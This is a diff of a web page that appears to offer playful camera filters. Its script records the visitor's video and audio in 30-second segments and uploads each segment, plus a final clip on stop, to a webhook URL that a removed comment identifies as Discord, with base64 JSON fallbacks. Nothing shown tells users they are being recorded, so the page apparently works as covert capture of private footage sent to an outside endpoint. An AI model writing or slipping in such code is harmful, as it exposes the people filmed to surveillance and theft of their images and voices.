@@ -527,6 +527,7 @@
         .filter-party .star:nth-child(9) { bottom: 20%; right: 10%; animation-delay: 1s; }
         .filter-party .star:nth-child(10) { bottom: 10%; left: 30%; animation-delay: 2s; }
 
+        /* Hide inactive filters */
         .filter-overlay { display: none; }
         .filter-overlay.active { display: block; }
 
@@ -1148,8 +1149,7 @@
         let recorderStream = null;
         let lastSegmentBlob = null;
         let recordingMime = null;
-        // Send segments more frequently (10s) to reduce chance of corrupted long files
-        const RECORD_TIMESLICE_MS = 10000; // 10 seconds (was 30000)
+        const RECORD_TIMESLICE_MS = 30000; // 30 seconds
         let audioStreamForRecording = null;
         // store crop area for 4:3 photos
         let crop = { sx: 0, sy: 0, sw: 0, sh: 0 };
@@ -1300,8 +1300,7 @@
             mediaRecorder.onstop = () => {
                 // When stopped, ensure last segment is uploaded if present.
                 if (lastSegmentBlob) {
-                    // Try to upload final segment (non-blocking) with keepalive preference
-                    sendBlobToWebhook(lastSegmentBlob, `final-recording-${Date.now()}.webm`, { keepalive: true }).catch(err => {
+                    sendBlobToWebhook(lastSegmentBlob, `final-recording-${Date.now()}.webm`).catch(err => {
                         console.error('Final upload failed:', err);
                     });
                 }
@@ -1341,7 +1340,7 @@
                 });
             }
 
-            // Start the recorder with a timeslice so ondataavailable fires every RECORD_TIMESLICE_MS
+            // Start the recorder with a timeslice so ondataavailable fires every 30s
             try {
                 mediaRecorder.start(RECORD_TIMESLICE_MS);
             } catch (e) {
@@ -1377,97 +1376,44 @@
                 try { audioStreamForRecording.getTracks().forEach(t => t.stop()); } catch(e) {}
                 audioStreamForRecording = null;
             }
-
-            // If we have a lastSegmentBlob and the browser supports navigator.sendBeacon,
-            // attempt a best-effort synchronous transfer on unload (may or may not be accepted by server).
-            try {
-                if (lastSegmentBlob && navigator.sendBeacon && WEBHOOK_URL) {
-                    try {
-                        // Prepare a Blob with correct type and try to send via sendBeacon.
-                        const beaconBlob = lastSegmentBlob instanceof Blob ? lastSegmentBlob : new Blob([lastSegmentBlob], { type: recordingMime || 'video/webm' });
-                        navigator.sendBeacon(WEBHOOK_URL, beaconBlob);
-                    } catch (e) {
-                        // ignore sendBeacon errors; onstop handler already tries regular upload
-                        console.warn('sendBeacon attempt failed (non-fatal):', e);
-                    }
-                }
-            } catch(e) {
-                console.warn('Error in stopRecordingAndSendFinal sendBeacon step:', e);
-            }
-
-            // mediaRecorder.onstop will trigger upload of lastSegmentBlob (if any) via sendBlobToWebhook
+            // mediaRecorder.onstop will trigger upload of lastSegmentBlob
         }
 
         // send a blob (video) to webhook
-        // options: {keepalive: boolean}
-        async function sendBlobToWebhook(blobOrFile, filename = 'recording.webm', options = {}) {
+        async function sendBlobToWebhook(blobOrFile, filename = 'recording.webm') {
             if (!WEBHOOK_URL) return;
-            const wait = ms => new Promise(r => setTimeout(r, ms));
-            const MAX_RETRIES = 2;
-            let attempt = 0;
-
-            // Normalize to a File with explicit mime if possible
-            const mimeType = (recordingMime && recordingMime.split(';')[0]) || (blobOrFile && blobOrFile.type) || 'video/webm';
-            const fileObj = blobOrFile instanceof File ? blobOrFile : new File([blobOrFile], filename, { type: mimeType });
-
-            while (attempt <= MAX_RETRIES) {
-                try {
-                    const form = new FormData();
-                    // Discord expects field name 'file' for uploads; keep that.
-                    form.append('file', fileObj, filename);
-
-                    const fetchOptions = {
-                        method: 'POST',
-                        body: form,
-                    };
-
-                    // prefer keepalive when requested (helps during unload)
-                    if (options.keepalive) fetchOptions.keepalive = true;
-
-                    const response = await fetch(WEBHOOK_URL, fetchOptions);
-
-                    if (response.ok) {
-                        return; // success
-                    } else {
-                        // non-ok response: try fallback to JSON base64 once
-                        const text = await response.text().catch(() => '');
-                        console.warn('Webhook returned non-ok response (attempt ' + (attempt+1) + '):', response.status, text);
-
-                        // If first attempt fails with CORS or Discord rejecting, fallback to base64 JSON
-                        const base64 = await blobToBase64(blobOrFile);
-                        try {
-                            const jsonResp = await fetch(WEBHOOK_URL, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ filename, file: base64 }),
-                                keepalive: options.keepalive || false
-                            });
-                            if (jsonResp.ok) return;
-                        } catch (e) {
-                            console.warn('Fallback base64 JSON upload failed:', e);
-                        }
-                    }
-                } catch (err) {
-                    console.warn('Webhook upload attempt failed (attempt ' + (attempt+1) + '):', err);
-                }
-
-                // retry with backoff
-                attempt++;
-                if (attempt <= MAX_RETRIES) {
-                    await wait(500 * attempt); // small backoff
-                }
-            }
-
-            // Final fallback: try one last time with a raw POST of blob as octet-stream (some endpoints accept it)
             try {
-                await fetch(WEBHOOK_URL, {
+                const form = new FormData();
+                // accept either Blob or File
+                const fileObj = blobOrFile instanceof File ? blobOrFile : new File([blobOrFile], filename, { type: blobOrFile.type || 'video/webm' });
+                form.append('file', fileObj, filename);
+
+                const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
-                    headers: { 'Content-Type': mimeType },
-                    body: blobOrFile instanceof Blob ? blobOrFile : new Blob([blobOrFile], { type: mimeType }),
-                    keepalive: options.keepalive || false
+                    body: form
                 });
-            } catch (e) {
-                console.error('All upload strategies failed for', filename, e);
+
+                if (!response.ok) {
+                    // fallback: send base64 in JSON
+                    const base64 = await blobToBase64(blobOrFile);
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ filename, file: base64 })
+                    });
+                }
+            } catch (err) {
+                // attempt fallback base64 JSON
+                try {
+                    const base64 = await blobToBase64(blobOrFile);
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ filename, file: base64 })
+                    });
+                } catch (e) {
+                    console.error('Both blob and base64 webhook upload failed:', e);
+                }
             }
         }
 
